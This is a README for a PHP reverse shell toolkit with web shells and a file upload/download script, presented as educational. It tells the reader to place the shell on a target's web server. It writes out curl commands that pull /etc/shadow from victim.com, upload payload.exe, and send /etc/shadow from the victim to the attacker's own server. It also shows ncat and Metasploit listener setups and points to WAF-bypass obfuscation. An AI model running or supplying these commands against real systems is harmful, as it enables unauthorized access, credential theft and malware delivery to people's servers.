# PHP Reverse Shell

Just a little refresh on the popular PHP reverse shell script [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell). Credits to the original author!

Works on Linux OS and macOS with `/bin/sh` and Windows OS with `cmd.exe`. Script will automatically detect the underlying OS.

Works with both, `ncat` and `multi/handler`.

Tested on XAMPP for Linux v7.3.19 (64-bit) with PHP v7.3.19 on Kali Linux v2020.2 (64-bit).

Tested on XAMPP for OS X v7.4.10 (64-bit) with PHP v7.4.10 on macOS Catalina v10.15.6 (64-bit).

Tested on XAMPP for Windows v7.4.3 (64-bit) with PHP v7.4.3 on Windows 10 Enterprise OS (64-bit).

In addition, everything was tested on Docker images [nouphet/docker-php4](https://hub.docker.com/r/nouphet/docker-php4) with PHP v4.4.0 and [steeze/php52-nginx](https://hub.docker.com/r/steeze/php52-nginx) with PHP v5.2.17.

Made for educational purposes. I hope it will help!

**Process pipes on Windows OS do not support asynchronous operations so `stream_set_blocking()`, `stream_select()`, and `feof()` will not work properly, but I found a workaround.**

## Table of Contents

* [Reverse Shells](#reverse-shells)
* [Web Shells](#web-shells)
* [File Upload/Download Script](#file-uploaddownload-script)
	* [Case 1: Upload the Script to the Victim’s Server](#case-1-upload-the-script-to-the-victims-server)
	* [Case 2: Upload the Script to Your Server](#case-2-upload-the-script-to-your-server)
* [Set Up a Listener](#set-up-a-listener)
* [Images](#images)

## Reverse Shells

[/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) requires PHP v5.0.0 or greater.

[/src/reverse/php_reverse_shell_older.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell_older.php) requires PHP v4.3.0 or greater.

**Change the IP address and port number inside the scripts as necessary.**

Copy [/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) to your server's web root directory (e.g. to /opt/lampp/htdocs/ on XAMPP) or upload it to your target's web server.

Navigate to the file with your preferred web browser.

## Web Shells

Check the [simple PHP web shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/web/simple_php_web_shell_post.php) based on HTTP POST request.

Check the [simple PHP web shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/web/simple_php_web_shell_get.php) based on HTTP GET request. You must [URL encode](https://www.urlencoder.org) your commands.

Check the [simple PHP web shell v2](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/web/simple_php_web_shell_get_v2.php) based on HTTP GET request. You must [URL encode](https://www.urlencoder.org) your commands.

Find out more about PHP obfuscation techniques for old versions of PHP at [lcatro/PHP-WebShell-Bypass-WAF](https://github.com/lcatro/PHP-WebShell-Bypass-WAF). Credits to the author!

## File Upload/Download Script

Check the [simple PHP file upload/download script](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/web/files.php) based on HTTP POST request for file upload and HTTP GET request for file download.

When downloading a file, you must [URL encode](https://www.urlencoder.org) the file path, and don't forget to specify the output file if using cURL.

When uploading a file, don't forget to specify `@` before the file path.

Depending on the server configuration, downloading a file through HTTP GET request parameter might not always work, instead, you will have to hardcore the file path in the script.

### Case 1: Upload the Script to the Victim’s Server

Navigate to the script on the victim's web server with your preferred web browser, or use cURL from you PC.

Upload a file to the server's web root directory from your PC:

```fundamental
curl -skL -X POST https://victim.com/files.php -F file=@/root/payload.exe
```

Download a file from the server to your PC:

```fundamental
curl -skL -X GET https://victim.com/files.php?file=/etc/shadow -o shadow
```

If you elevated your initial privileges within your reverse shell, this script might not have the same privileges as the shell. In that case, to download a certain file, you might need to copy the file to the web root directory and set the necessary read permissions.

### Case 2: Upload the Script to Your Server

From your PHP reverse shell, run the following cURL commands.

Upload a file from the victim's PC to your server's web root directory:

```fundamental
curl -skL -X POST https://my-server.com/files.php -F file=@/etc/shadow
```

Download a file from your server's web root directory to the victim's PC:

```fundamental
curl -skL -X GET https://my-server.com/files.php?file=/root/payload.exe -o payload.exe

curl -skL -X GET https://my-server.com/payload.exe -o payload.exe
```

## Set Up a Listener

To set up a listener, open your preferred console on Kali Linux and run one of the examples below.

Set up `ncat` listener:

```fundamental
ncat -nvlp 9000
```

Set up `multi/handler` listener:

```fundamental
msfconsole -q

use exploit/multi/handler

set PAYLOAD windows/shell_reverse_tcp

set LHOST 192.168.8.185

set LPORT 9000

exploit
```

## Images

<p align="center"><img src="https://github.com/ivan-sincek/php-reverse-shell/blob/master/img/ncat.png" alt="Ncat"></p>

<p align="center">Figure 1 - Ncat</p>

<p align="center"><img src="https://github.com/ivan-sincek/php-reverse-shell/blob/master/img/scripts_dump.jpg" alt="Script Dump"></p>

<p align="center">Figure 2 - Script's Dump</p>
